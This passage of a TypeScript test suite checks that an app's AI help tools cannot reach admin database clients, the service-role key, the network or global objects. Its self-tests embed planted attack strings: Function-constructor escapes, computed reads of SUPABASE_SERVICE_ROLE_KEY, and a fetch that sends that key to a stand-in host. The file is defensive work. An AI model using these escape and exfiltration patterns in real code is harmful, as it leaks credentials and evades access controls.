    uses(sf);
  }
  return problems;
}

/**
 * R-2879 call caps — the per-question count lives on the HelpSession, and the per-person count needs
 * the user id. So the route must open exactly ONE session (not in a loop) and hand `userId: user.id`
 * to every tool runner call (legacy runHelpDataTools included, where the type lets it be left out).
 */
function sessionOpenProblems(f: string, src: string): string[] {
  const sf = ts.createSourceFile(f, src, ts.ScriptTarget.Latest, true, ts.ScriptKind.TS);
  const problems: string[] = [];
  const at = (n: ts.Node) => `${f}:${sf.getLineAndCharacterOfPosition(n.getStart(sf)).line + 1}`;
  const locals = new Set<string>();
  const RUNNERS = new Set(["runHelpDataTools", "runHelpDataToolsV2", "runHelpTools"]);
  let opens = 0;
  const visit = (n: ts.Node): void => {
    if (ts.isImportSpecifier(n) && (n.propertyName ?? n.name).text === "openHelpSession") locals.add(n.name.text);
    if (ts.isCallExpression(n) && ts.isIdentifier(n.expression)) {
      if (locals.has(n.expression.text)) {
        opens++;
        for (let p: ts.Node = n.parent; p; p = p.parent) {
          if (ts.isForStatement(p) || ts.isForOfStatement(p) || ts.isForInStatement(p) || ts.isWhileStatement(p) || ts.isDoStatement(p)) { problems.push(`${at(n)}: openHelpSession() inside a loop — one session per question`); break; }
        }
      }
      if (RUNNERS.has(n.expression.text)) {
        const ctx = n.arguments[1];
        const ok = !!ctx && ts.isObjectLiteralExpression(ctx) && ctx.properties.some((p) => ts.isPropertyAssignment(p) && ts.isIdentifier(p.name) && p.name.text === "userId" && p.initializer.getText(sf) === "user.id");
        if (!ok) problems.push(`${at(n)}: ${n.expression.text}(…) must be given { userId: user.id, … } (the per-person tool limit)`);
      }
    }
    ts.forEachChild(n, visit);
  };
  visit(sf);
  if (opens !== 1) problems.push(`${f}: openHelpSession() is called ${opens} times — exactly one session per question (it carries the tool-call count)`);
  return problems;
}

/** R-2879 finding 2 — every reached file outside help-tools must be on the named list. */
function graphListProblems(reached: readonly string[]): string[] {
  return reached.filter((f) => !isHelpFile(f) && !HELP_GRAPH_ALLOWED.includes(f))
    .map((f) => `${f}: reached from the help tools but not on HELP_GRAPH_ALLOWED — read it (no network / mail / DB client / side effects), then add it`);
}

/** Walk the import graph from the help tools; collect every rule break. */
function scanGraph(): { problems: string[]; reached: string[] } {
  const problems: string[] = [];
  const seen = new Set<string>();
  const used = new Set<string>();
  const queue = [...helpFiles(), LEGACY];
  while (queue.length) {
    const f = queue.shift()!;
    if (seen.has(f)) continue;
    seen.add(f);
    const { imports, problems: p } = scanFile(f, readSource(f), used);
    problems.push(...p);
    for (const imp of imports) {
      if (imp.typeOnly || !isLocal(imp.spec)) continue;
      const target = resolve(f, imp.spec);
      if (!target || target === SERVER) continue; // reported above; never walk into the module that also defines the admin client
      if (!isTest(target)) queue.push(target);
    }
  }
  problems.push(...graphListProblems([...seen]));
  for (const site of FOLLOWED_COMPUTED_SITES) {
    if (!used.has(`${site.file}|${site.fn}|${site.object}`)) problems.push(`FOLLOWED_COMPUTED_SITES: ${site.file} ${site.fn} ${site.object} matches no computed read any more — remove the entry`);
  }
  return { problems, reached: [...seen] };
}

const PLANTED = `${HELP_DIR}/planted.ts`;
const plantedProblems = (src: string) => scanFile(PLANTED, src).problems;

describe("R-2774 Help AI tools never reach the service role", () => {
  it("the help-tools import graph names no admin client, service-role key or key-built client", () => {
    const { problems, reached } = scanGraph();
    expect(reached.length).toBeGreaterThan(helpFiles().length); // the walk really followed imports
    expect(problems).toEqual([]);
  });

  it("the scanner catches a planted admin import (self-test)", () => {
    expect(plantedProblems(`import { createAdminClient } from "@/lib/supabase/server";\nconst c = createAdminClient();`)).not.toEqual([]);
    expect(plantedProblems(`import { createClient } from "@/lib/supabase/server";\nconst c = createClient();`)).not.toEqual([]); // only session.ts
    expect(scanFile(SESSION, `import { createClient } from "@/lib/supabase/server";\nconst c = createClient();`).problems).toEqual([]);
    expect(scanFile(SESSION, `import { createClient, createAdminClient as a } from "@/lib/supabase/server";`).problems).not.toEqual([]);
    expect(plantedProblems(`import { createClient as x } from "@supabase/supabase-js";`)).not.toEqual([]);
    expect(plantedProblems(`import type { SupabaseClient } from "@supabase/supabase-js";\nimport type { A } from "@/lib/supabase/bare";\ntype T = typeof import("./types");`)).toEqual([]);
    expect(resolve(SESSION, "@/lib/supabase/server")).toBe(SERVER);
    expect(plantedProblems("// createAdminClient()\n/* SUPABASE_SERVICE_ROLE_KEY */ const a = 1;")).toEqual([]);
  });

  it("the scanner catches a planted import of a module that picks its own user / tenant or talks to the DB directly (self-test, review M2)", () => {
    for (const spec of ["@/server/db", "@/server/db/tenant", "@supabase/postgrest-js", "@prisma/client", "@prisma/adapter-pg", "pg"]) {
      expect(plantedProblems(`import { x } from "${spec}";\nx();`), spec).not.toEqual([]);
      expect(plantedProblems(`const m = await import("${spec}");`), spec).not.toEqual([]);
    }
    expect(plantedProblems(`import type { Pool } from "pg";`)).toEqual([]);
  });

  it("the scanner catches backtick / computed dynamic imports and code hidden after a '//' inside a string (self-test, review L3)", () => {
    expect(plantedProblems("const m = await import(`@/lib/supabase/bare`);")).not.toEqual([]);
    expect(plantedProblems("const p = \"@/lib/supabase/\" + \"bare\";\nconst m = await import(p);")).not.toEqual([]);
    expect(plantedProblems("const m = await import(`@/lib/supabase/${'bare'}`);")).not.toEqual([]);
    expect(plantedProblems("const m = await import(\"@/lib/\" + \"supabase/bare\");")).not.toEqual([]);
    expect(plantedProblems("const u = \"a//b\"; const c = createAdminClient();")).not.toEqual([]);
    expect(plantedProblems("const u = 'http://x'; const m = await import(\"@/lib/supabase/bare\");")).not.toEqual([]);
    expect(plantedProblems("const u = `x//y`; const k = SUPABASE_SERVICE_ROLE_KEY;")).not.toEqual([]);
    expect(plantedProblems("const re = /\\/\\//; const c = createAdminClient();")).not.toEqual([]);
    // still clean: comments that only talk about it, a literal import of a followed file, type-position import()
    expect(plantedProblems("// createAdminClient()\n/* import(x) */ const a = \"x\"; const m = await import(\"./types\");\ntype T = typeof import(\"./types\");")).toEqual([]);
  });

  it("the scanner is the TypeScript parser: no regex / string / comment trick hides code (self-test, rev2 #2-4)", () => {
    // A regex literal after `)` — a hand scanner reads it as division and swallows the next line.
    expect(plantedProblems("declare const x: boolean;\nif (x) /a\\//.test(\"\"); import { createAdminClient as mk } from \"@/lib/supabase/server\";\nmk();")).not.toEqual([]);
    // Ambient powers in a help-tools file: process (any form), fetch, require, createRequire, eval, Function, globalThis.
    expect(plantedProblems("const k = process[\"env\"][\"SUPABASE_\" + \"SERVICE_ROLE_KEY\"];")).not.toEqual([]);
    expect(plantedProblems("const r = fetch(\"https://db.example/rest/v1/tenant_secrets\");")).not.toEqual([]);
    expect(plantedProblems("import { createRequire } from \"node:module\";\nconst req = createRequire(import.meta.url);\nconst pg = req(\"p\" + \"g\");")).not.toEqual([]);
    expect(plantedProblems("import * as m from \"module\";\nconst x = m;")).not.toEqual([]);
    expect(plantedProblems("const r = require;\nconst pg = r(\"pg\");")).not.toEqual([]);
    expect(plantedProblems("const f = eval(\"1\");")).not.toEqual([]);
    expect(plantedProblems("const f = new Function(\"return 1\");")).not.toEqual([]);
    expect(plantedProblems("const g = globalThis;")).not.toEqual([]);
    // A local import that does not resolve to a file the walk follows fails closed (.js / .mjs too).
    expect(plantedProblems("import { x } from \"./nope.js\";\nx();")).not.toEqual([]);
    expect(plantedProblems("import { x } from \"@/lib/does-not-exist.mjs\";\nx();")).not.toEqual([]);
    // npm packages from a help-tools file: only the allowlist.
    expect(plantedProblems("import axios from \"axios\";\naxios.get(\"/\");")).not.toEqual([]);
    expect(plantedProblems("import { z } from \"zod\";\nconst s = z.string();")).toEqual([]);
  });

  it("the scanner catches table / rpc / storage / auth use and env reads in help tools (self-test)", () => {
    expect(plantedProblems("declare const c: any;\nc.from(\"invoices\");")).not.toEqual([]);
    expect(plantedProblems("declare const c: any;\nc[\"rpc\"](\"x\");")).not.toEqual([]);
    expect(plantedProblems("declare const c: any;\nc.storage.from(\"b\");")).not.toEqual([]);
    expect(plantedProblems("declare const c: any;\nc.auth.getUser();")).not.toEqual([]);
    expect(plantedProblems("const v = process.env.HELP_AI_V2;")).not.toEqual([]); // only registry.ts
    expect(scanFile(REGISTRY, "const v = process.env.HELP_AI_V2;").problems).toEqual([]);
    expect(scanFile(REGISTRY, "const v = process.env.OTHER;").problems).not.toEqual([]);
    // Array.from and a property merely NAMED fetch are not client / ambient uses.
    expect(plantedProblems("const a = Array.from([1]); const o = { fetch: 1 }.fetch;")).toEqual([]);
  });

  it("scopedReader / sessionClient / runOneTool are called only by the runner and the legacy path", () => {
    const NAMES = new Set(["scopedReader", "sessionClient", "runOneTool"]);
    const callers: string[] = [];
    for (const full of listSourceFiles(SRC, (name) => /\.tsx?$/.test(name) && !isTest(name))) {
      const f = rel(full);
      const src = readSource(f);
      if (!/scopedReader|sessionClient|runOneTool/.test(src)) continue;
      const sf = ts.createSourceFile(f, src, ts.ScriptTarget.Latest, true, f.endsWith(".tsx") ? ts.ScriptKind.TSX : ts.ScriptKind.TS);
      let calls = false;
      const visit = (n: ts.Node): void => {
        if (ts.isCallExpression(n) && ts.isIdentifier(n.expression) && NAMES.has(n.expression.text)) calls = true;
        ts.forEachChild(n, visit);
      };
      visit(sf);
      if (calls) callers.push(f);
    }
    const ok = new Set([`${HELP_DIR}/runner.ts`, `${HELP_DIR}/reader.ts`, `${HELP_DIR}/session.ts`, LEGACY]);
    expect(callers.filter((f) => !ok.has(f))).toEqual([]);
  });

  it("no credential table and no table with a secret column is help-readable", () => {
    const secretTables = new Set(SECRET_COLUMNS.map((c) => c.split(".")[0]));
    for (const t of HELP_READ_TABLES) {
      expect(HELP_NEVER_TABLES, t).not.toContain(t);
      expect(secretTables.has(t), t).toBe(false);
    }
    for (const t of secretTables) expect(HELP_NEVER_TABLES).toContain(t);
  });
});

/**
 * R-2879 / H-01b (17 Nov 2026) — the holes the third review of R-2774 found in this guard, closed
 * BEFORE H-02 lets the model pass arguments. Every plant below came back [] from the R-2774 scanner.
 */
describe("R-2879 guard holes closed before H-02", () => {
  const NH = "src/lib/zz-planted.ts"; // a file the walk would reach outside help-tools

  it("finding 1: no way to the global object or Function by a name the old denylist did not know (self-test)", () => {
    const plants: Record<string, string> = {
      ctor: 'const F = ({}).constructor.constructor; const g = F("return this")(); const k = g["pro"+"cess"]["env"]["SUPABASE_" + "SERVICE_" + "ROLE_KEY"]; g["fe"+"tch"]("https://x/rest/v1/tenant_secrets", { headers: { apikey: k } });',
      ctorDestructure: 'const { constructor: C } = () => {}; const p = C("return process")();',
      ctorShorthand: 'const { constructor } = () => {}; constructor("return 1")();',
      ctorString: 'const f = () => 1; const k = "constructor"; export const x = [f, k];',
      ctorElement: 'const f = () => 1; const C = f["constructor"];',
      asyncCtor: 'const AF = (async () => {}).constructor; AF("return 1");',
      reflect: 'const g = Reflect.get(() => 1, "con" + "structor")("return this")();',
      self: "const s = self;",
      window: "const w = window;",
      websocket: 'const ws = new WebSocket("wss://x");',
      worker: 'const w = new Worker("x.js");',
      wasm: "const m = WebAssembly.compile(new Uint8Array(0));",
      xhr: "const x = new XMLHttpRequest();",
      navigator: 'navigator.sendBeacon("https://x", "d");',
      thisFn: "const g = (function (this: any) { return this; })();",
      thisPlain: "const g = (function () { return this; })();",
      thisTop: "const g = this;",
      thisObjectMethod: "const o = { m() { return this; } };",
      importMeta: "const m = import.meta.url;",
      computedMember: 'const f = () => 1; const k = "con" + "structor"; const C = (f as any)[k];',
      computedBinding: 'const k = "con" + "structor"; const { [k]: C } = (() => 1) as any;',
      protoOf: "const p = Object.getPrototypeOf(() => 1);",
      descriptors: "const d = Object.values(Object.getOwnPropertyDescriptors(Object.getPrototypeOf(() => 1)));",
      aliasGlobal: "const O = Object; const p = O.getPrototypeOf(() => 1);",
      declareShadow: "declare const process: any; const k = process.env.X;",
      shadowScope: "function a() { const self = 1; return self; }\nexport const s = self;",
      timerString: 'setTimeout("x()", 1);',
      symbolFor: 'const s = Symbol.for("x");',
      unknownGlobal: "const q = queueMicrotask;",
      evalOpt: 'const e = (0, eval)?.("1");',
      typeOnlyImport: 'import type { WebSocket } from "./types"; const ws = new WebSocket("wss://x");',
      typeOnlySpecifier: 'import { type queueMicrotask } from "./types"; queueMicrotask(() => undefined);',
      interfaceShadow: "interface structuredClone { a: 1 } const c = structuredClone({});",
    };
    for (const [k, src] of Object.entries(plants)) expect(plantedProblems(src), k).not.toEqual([]);
    // What help tools really use stays clean: locals, parameters, allowlisted globals in their allowed form.
    expect(plantedProblems([
      'import { z } from "zod";',
      "const LIST = [1, 2] as const;",
      'class Refused extends Error { constructor(why: string) { super(why); this.name = "Refused"; } }',
      "export function f(self: number, rows: readonly { id?: unknown }[]): unknown {",
      "  const o: Record<string, unknown> = Object.create(null);",
      "  const n = Math.min(self, Number.isSafeInteger(self) ? 1 : 2);",
      '  const ids = rows.map((r) => (r.id == null ? "" : String(r.id))).filter(Boolean);',
      "  const t = setTimeout(() => undefined, 5); clearTimeout(t);",
      '  return Object.freeze({ o, n, ids, s: z.string(), l: LIST[0], e: new Refused("x"), d: new Date(), p: Promise.all([]), m: new Map<string, number>() });',
      "}",
    ].join("\n"))).toEqual([]);
  });

  it("finding 2: a help file imports only named safe local modules; files it reaches may not hold ambient powers (self-test)", () => {
    // Real, resolvable local modules that are NOT on the list (network / shared store / mail).
    expect(plantedProblems('import { rateLimit } from "@/lib/security/rate-limit";\nrateLimit("k", { limit: 1, windowMs: 1 });')).not.toEqual([]);
    expect(plantedProblems('import { geminiJson } from "@/lib/ai/gemini";\ngeminiJson({} as never);')).not.toEqual([]);
    // baseUrl-style spec (tsconfig baseUrl "."): local, followed and checked — never taken for an npm package.
    expect(plantedProblems('import { x } from "src/lib/supabase/bare"; x();')).not.toEqual([]);
    expect(scanFile(NH, 'import { createClient } from "src/lib/supabase/server"; export const c = () => createClient();').problems).not.toEqual([]);
    expect(isLocal("src/lib/supabase/server")).toBe(true);
    expect(isLocal("zod")).toBe(false);
    expect(resolve(NH, "src/lib/supabase/server")).toBe(SERVER);
    // In a followed file: computed process access + fetch, npm / node builtins, sockets, Function.
    expect(scanFile(NH, 'export const k = process["env"]["SUPABASE_" + "SERVICE_" + "ROLE_KEY"]; export const f = (u: string) => fetch(u, { headers: { apikey: String(k) } });').problems).not.toEqual([]);
    expect(scanFile(NH, 'export const k = process["env"];').problems).not.toEqual([]);
    expect(scanFile(NH, 'import postgres from "postgres"; export const a = postgres;').problems).not.toEqual([]);
    expect(scanFile(NH, 'import http from "node:http"; export const a = http;').problems).not.toEqual([]);
    expect(scanFile(NH, 'import cp from "child_process"; export const a = cp;').problems).not.toEqual([]);
    expect(scanFile(NH, 'export const w = () => new WebSocket("wss://x");').problems).not.toEqual([]);
    expect(scanFile(NH, "export const g = () => ({}).constructor;").problems).not.toEqual([]);
    // R-2882: a computed read is judged by what the object is DECLARED as — a plain data map is fine, a parameter is not.
    expect(scanFile(NH, "const M: Record<string, number> = { a: 1 }; export const pick = (k: string, i: number) => M[k] + [1, 2][i];").problems).toEqual([]);
    expect(scanFile(NH, "export const pick = (o: Record<string, number>, k: string, i: number) => o[k] + [1, 2][i];").problems).not.toEqual([]);
    expect(scanFile(NH, 'import { clsx } from "clsx"; import { twMerge } from "tailwind-merge"; export const cn = (a: string) => twMerge(clsx(a));').problems).toEqual([]);
    // The whole graph is a named list: a new file reached from a help tool fails until it is added with review.
    expect(graphListProblems([...HELP_GRAPH_ALLOWED, `${HELP_DIR}/reader.ts`, LEGACY])).toEqual([]);
    expect(graphListProblems([...HELP_GRAPH_ALLOWED, "src/lib/zz-new-helper.ts"])).not.toEqual([]);
  });

  it("finding 3: restricted help-tools exports are checked by MODULE — alias, namespace and re-export forms too (self-test)", () => {
    const OUT = "src/lib/zz-outside.ts";
    const bad: Record<string, string> = {
      alias: 'import { scopedReader as mk } from "@/lib/ai/help-tools/reader"; declare const c: any; mk(c, "t");',
      namespace: 'import * as r from "@/lib/ai/help-tools/runner"; declare const t: any; r.runOneTool(t, {}, {} as any);',
      relative: 'import { sessionClient as sc } from "./ai/help-tools/session"; declare const s: any; sc(s);',
      baseUrl: 'import { runOneTool as r1 } from "src/lib/ai/help-tools/runner"; declare const t: any; r1(t, {}, {} as any);',
      define: 'import { defineHelpTool as d } from "@/lib/ai/help-tools/types"; export const t = d({} as any);',
      build: 'import { buildRegistry } from "@/lib/ai/help-tools/registry"; export const r = buildRegistry([]);',
      registryMap: 'import { HELP_TOOL_REGISTRY } from "@/lib/ai/help-tools/registry"; export const r = HELP_TOOL_REGISTRY;',
      customRegistry: 'import { runHelpTools } from "@/lib/ai/help-tools/runner"; declare const a: any; runHelpTools(a, a, a, a);',
      spreadArgs: 'import { runHelpTools } from "@/lib/ai/help-tools/runner"; declare const a: any[]; (runHelpTools as any)(...a);',
      handedOn: 'import { runHelpTools } from "@/lib/ai/help-tools/runner"; export const r = runHelpTools;',
      reexport: 'export { scopedReader } from "@/lib/ai/help-tools/reader";',
      exportStar: 'export * from "@/lib/ai/help-tools/runner";',
      dynamic: 'export const m = () => import("@/lib/ai/help-tools/reader");',
      session: 'import { openHelpSession } from "@/lib/ai/help-tools/session"; export const s = () => openHelpSession();',
      toolDefs: 'import { DATA_TOOLS } from "@/lib/ai/help-tools/data-tools"; declare const ctx: any; export const r = () => DATA_TOOLS[0].run({}, ctx);',
      toolsFor: 'import { helpToolsFor } from "@/lib/ai/help-tools/registry"; export const t = helpToolsFor("owner");',
    };
    for (const [k, src] of Object.entries(bad)) expect(restrictedProblems(OUT, src), k).not.toEqual([]);
    // Inside help-tools: a tool file may not wrap a client either (namespace form included).
    expect(restrictedProblems(PLANTED, 'import * as r from "./reader"; declare const c: any; r.scopedReader(c, "t");')).not.toEqual([]);
    expect(restrictedProblems(PLANTED, 'import { scopedReader as mk } from "./reader"; declare const c: any; mk(c, "t");')).not.toEqual([]);
    expect(restrictedProblems(LEGACY, 'import { runHelpTools } from "@/lib/ai/help-tools/runner"; declare const a: any; runHelpTools(a, a, a, a);')).not.toEqual([]);
    expect(restrictedProblems(LEGACY, 'import { runOneTool } from "@/lib/ai/help-tools/runner"; export const again = runOneTool;')).not.toEqual([]);
    // What is allowed today.
    expect(restrictedProblems("src/app/api/ai/help/route.ts", 'import { openHelpSession } from "@/lib/ai/help-tools/session"; import { helpAiV2Enabled } from "@/lib/ai/help-tools/registry"; import type { HelpSourceRef } from "@/lib/ai/help-tools/types"; export const s = () => helpAiV2Enabled("owner") && openHelpSession();')).toEqual([]);
    expect(restrictedProblems(LEGACY, 'import { runHelpTools, runOneTool } from "@/lib/ai/help-tools/runner"; declare const a: any; runHelpTools(a, a, a); runOneTool(a, a, a); type P = Parameters<typeof runOneTool>[0];')).toEqual([]);
    expect(restrictedProblems(PLANTED, 'import { defineHelpTool } from "./types"; export const t = defineHelpTool({} as any);')).toEqual([]);
  });

  it("finding 3: no file in src breaks the restricted-export rule", () => {
    const problems: string[] = [];
    let looked = 0;
    for (const full of listSourceFiles(SRC, (name) => /\.tsx?$/.test(name) && !isTest(name))) {
      const f = rel(full);
      const src = readSource(f);
      if (!/help-tools|help-data-tools/.test(src) && !isHelpFile(f)) continue;
      looked++;
      problems.push(...restrictedProblems(f, src));
    }
    expect(looked).toBeGreaterThan(helpFiles().length); // route.ts at least
    expect(problems).toEqual([]);
  });

  it("call caps cannot be side-stepped by the route: one session per question, the person's id on both paths", () => {
    expect(sessionOpenProblems(ROUTE, readSource(ROUTE))).toEqual([]);
    // self-test: a second session, or one opened inside a loop, resets the per-question count
    const two = 'import { openHelpSession } from "@/lib/ai/help-tools/session"; export const a = () => [openHelpSession(), openHelpSession()];';
    const loop = 'import { openHelpSession as o } from "@/lib/ai/help-tools/session"; export function a() { for (let i = 0; i < 8; i++) o(); }';
    const loop2 = 'import { openHelpSession } from "@/lib/ai/help-tools/session"; export async function a() { let n = 0; while (n++ < 8) await Promise.resolve(openHelpSession()); }';
    const noUser = 'import { openHelpSession } from "@/lib/ai/help-tools/session"; declare const run: any, runHelpDataTools: any, supabase: any; export const a = () => [run(openHelpSession(), { tenantId: "t" }), runHelpDataTools(supabase, { tenantId: "t" })];';
    for (const src of [two, loop, loop2, noUser]) expect(sessionOpenProblems(ROUTE, src)).not.toEqual([]);
  });
});

/**
 * R-2882 / H-01c (17 Nov 2026) — what the independent review of R-2879 left in this guard, closed
 * BEFORE H-02 lets the model pass arguments. The plants in the first test came back [] from the
 * R-2879 scanner (they are the checker's own, chk2879): it matched the reviewed computed reads by
 * file + source text, so any `builder[m]` in reader.ts passed whatever `builder` and `m` were.
 */
describe("R-2882 guard: computed reads by declaration, followed files, zod internals", () => {
  const READER = `${HELP_DIR}/reader.ts`;

  it("finding 1: a computed read is matched by what its key / object are DECLARED as — the old text-matched sites no longer pass (self-test)", () => {
    const plants: [string, string, string][] = [
      ["reader builder[m] -> Function", READER, 'const m = ["con", "structor"].join(""); const builder: any = () => 0; export const g = builder[m]("return glob" + "alThis")();'],
      ["reader builder?.[m]", READER, 'const m = ["con", "structor"].join(""); const builder: any = () => 0; export const g = builder?.[m]("return 1")();'],
      ["reader q[m] on a function", READER, 'const m = ["con", "structor"].join(""); const q: any = () => 0; export const g = q[m]("return 1")();'],
      ["session h[k]", SESSION, 'const k = String(99) + "onstructor"; const h: any = () => 0; export const g = h[k]("return 1")();'],
      ["legacy list[i]", LEGACY, 'const i = "con" + "structor"; const list: any = async () => 0; export const g = list[i]("return pro" + "cess")();'],
      ["legacy TOOLS[tool] on a function", LEGACY, 'const TOOLS: any = () => 0; export const f = (tool: string) => TOOLS[tool]("x");'],
      ["legacy TOOLS[n] n a plain const", LEGACY, 'const TOOLS: any = () => 0; export const f = () => { const n = ["con", "structor"].join(""); return TOOLS[n]("x"); };'],
      ["loop var is let", PLANTED, 'const L = Object.freeze(["eq"] as const); export function f(b: any) { for (let m of L) b[m](); }'],
      ["loop over a parameter", PLANTED, "export function f(b: any, names: string[]) { for (const m of names) b[m](); }"],
      ["named list not frozen", PLANTED, 'const L = ["eq"] as const; export function f(b: any) { for (const m of L) b[m](); }'],
      ["list holds a computed word", PLANTED, 'const w = ["con", "structor"].join(""); const L = Object.freeze(["eq", w] as const); export function f(b: any) { for (const m of L) b[m](); }'],
      ["index of a map on a local object with its own map()", PLANTED, 'const o = { map(cb: any) { cb(0, ["con", "structor"].join("")); } }; export const f = (c: any) => o.map((_r: unknown, i: any) => c[i]);'],
      ["index of a map on a parameter", PLANTED, "export const f = (c: any, xs: { map: any }) => xs.map((_r: unknown, i: any) => c[i]);"],
      ["second read after a data map", PLANTED, "const o: any = {}; export const f = (m: string, n: string) => o[m][n];"],
      ["data map held in a let", PLANTED, "let o: any = {}; export const f = (m: string) => o[m];"],
      ["data map is a parameter", PLANTED, "export const f = (o: Record<string, unknown>, m: string) => o[m];"],
    ];
    for (const [name, file, src] of plants) expect(scanFile(file, src).problems, name).not.toEqual([]);
    // the same text with a different declaration does pass — proving it is the declaration that decides
    expect(scanFile(READER, 'const L = Object.freeze(["eq", "lt"] as const); export function f(builder: Record<string, (c: unknown) => unknown>) { const q: Record<string, unknown> = Object.create(null); for (const m of L) { q[m] = (c: unknown) => builder[m](c); } return Object.freeze(q); }').problems).toEqual([]);
    expect(scanFile(SESSION, 'export function bearers(c: { headers?: Record<string, unknown> } | null): unknown[] { const out: unknown[] = []; for (const h of [c?.headers]) { if (!h) continue; for (const k of ["Authorization", "authorization"]) { const v = h[k]; if (typeof v === "string") out.push(v); } } return out; }').problems).toEqual([]);
    expect(scanFile(LEGACY, [
      'import { runHelpTools } from "@/lib/ai/help-tools/runner";',
      'const TOOLS = Object.fromEntries([["a", 1]]) as Record<string, number>;',
      "export async function f(list: string[], tool: string, session: never, ctx: never) {",
      "  const res = await runHelpTools(session, ctx, list.map((name) => ({ name })));",
      "  return res.map((r, i) => ({ tool: list[i], n: TOOLS[tool], r }));",
      "}",
    ].join("\n")).problems).toEqual([]);
  });

  it("finding 2: files the help tools reach may not reflect on the prototype chain, name a way to Function, or read a computed key off a parameter (self-test)", () => {
    const NAV = "src/lib/nav.ts";
    const plants: Record<string, string> = {
      descriptor: 'export const d = Object.getOwnPropertyDescriptor(Object.getPrototypeOf(() => 0), "constructor");',
      descriptors: "export const F = Object.getOwnPropertyDescriptors(Object.getPrototypeOf(async () => 0));",
      protoOfComputedMember: 'export const g = Object["getPrototypeOf"](() => 0);',
      setProto: "export const s = Object.setPrototypeOf({}, null);",
      define: 'export const s = Object.defineProperty({}, "a", { value: 1 });',
      ctorString: 'export const x = ["constructor"].map((s) => s);',
      protoString: 'export const x = ["__proto__"].map((s) => s);',
      prototypeString: 'export const x = ["prototype"].map((s) => s);',
      computedOnParam: 'export const C = (f: any) => f["con" + "structor"];',
      computedOnFunction: 'const f: any = () => 0; const k = ["con", "structor"].join(""); export const C = f[k];',
      reflect: 'export const g = Reflect.get(() => 1, "x");',
    };
    for (const [k, src] of Object.entries(plants)) expect(scanFile(NAV, src).problems, k).not.toEqual([]);
    // what these files really do stays clean: plain data maps, builder functions that return one, fixed-list loops
    expect(scanFile(NAV, 'const M: Record<string, string[]> = {}; function build(): Record<string, string[]> { const out: Record<string, string[]> = {}; out["/a"] = ["A"]; return out; } const T = build(); export const t = (p: string) => T[p] ?? M[p]; export const u = Object.keys(T).map((s) => s.toUpperCase());').problems).toEqual([]);
    // a reviewed per-site entry matches by file + function + object + declaration — none of them alone is enough
    const SUMMARY = "src/lib/company/summary.ts";
    const want = "Readonly<Record<string, number>> | null | undefined";
    expect(scanFile(SUMMARY, `export function openTicketCount(counts: ${want}, s: string) { return counts?.[s]; }`).problems).toEqual([]);
    expect(scanFile(SUMMARY, "export function openTicketCount(counts: any, s: string) { return counts?.[s]; }").problems).not.toEqual([]); // declared differently
    expect(scanFile(SUMMARY, `export function otherName(counts: ${want}, s: string) { return counts?.[s]; }`).problems).not.toEqual([]); // another function
    expect(scanFile("src/lib/zz-summary.ts", `export function openTicketCount(counts: ${want}, s: string) { return counts?.[s]; }`).problems).not.toEqual([]); // another file
  });

  it("finding 4: a help file other than types.ts may not touch a zod schema's internals, or reflect on a prototype (self-test)", () => {
    const swap = 'export function f(t: { input: { _def: { unknownKeys: string } } }) { t.input._def.unknownKeys = "passthrough"; }';
    expect(plantedProblems(swap)).not.toEqual([]);
    expect(plantedProblems('export function f(t: any) { t.input["_def"] = {}; }')).not.toEqual([]);
    expect(plantedProblems("export function f(t: any) { return t.input._cached; }")).not.toEqual([]);
    expect(plantedProblems("export function f(o: any) { return o.getPrototypeOf(o); }")).not.toEqual([]);
    expect(scanFile(TYPES_FILE, "export const f = (s: { _def: { unknownKeys: string } }) => s._def.unknownKeys;").problems).toEqual([]);
    // and the real types.ts is the only help file that holds them
    const holders = helpFiles().filter((f) => /\b(_def|_cached|unknownKeys)\b/.test(readSource(f)) && f !== TYPES_FILE);
    expect(holders).toEqual([]);
  });
});
